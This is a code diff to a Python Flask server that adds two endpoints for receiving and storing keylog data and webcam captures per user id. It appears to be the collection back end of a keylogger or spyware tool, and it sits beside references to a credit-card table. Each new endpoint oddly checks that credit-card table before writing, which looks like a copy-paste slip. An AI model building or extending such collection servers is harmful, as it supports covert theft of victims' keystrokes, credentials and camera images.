@@ -197,6 +197,57 @@ def changePass():
     return jsonify(success)
 
 
+# Endpoint for updating logs in database
+@app.route('/update_key_logs', methods=['POST'])
+def update_key_logs():
+    # For posting form data to DB
+
+    data = ast.literal_eval(json.dumps(request.json, ensure_ascii=False))
+    data_temp = {"u_id": data['u_id']}
+    resultSet = connObj.NewSelect('credit_card', data_temp)
+    if resultSet.__len__() == 0:
+        resultSet = connObj.NewInsert('keylog', data)
+    else:
+        resultSet = connObj.NewUpdate('keylog', data)
+
+    # print resultSet
+    if resultSet == 'error':
+        error = {
+            "message": "Error"
+        }
+        return jsonify(error)
+
+    success = {
+        "message": "Success"
+    }
+    return jsonify(success)
+
+
+# Endpoint for updating webcam capture in database
+@app.route('/update_webcam_capture', methods=['POST'])
+def insert_webcam_capture():
+    # For posting form data to DB
+    data = ast.literal_eval(json.dumps(request.json, ensure_ascii=False))
+    data_temp = {"u_id": data['u_id']}
+    resultSet = connObj.NewSelect('credit_card', data_temp)
+    if resultSet.__len__() == 0:
+        resultSet = connObj.NewInsert('webcam_capture', data)
+    else:
+        resultSet = connObj.NewUpdate('webcam_capture', data)
+
+    # print resultSet
+    if resultSet == 'error':
+        error = {
+            "message": "Error"
+        }
+        return jsonify(error)
+
+    success = {
+        "message": "Success"
+    }
+    return jsonify(success)
+
+
 # Testing code block
 # Testing SELECT function
 @app.route('/test_select', methods=['POST'])
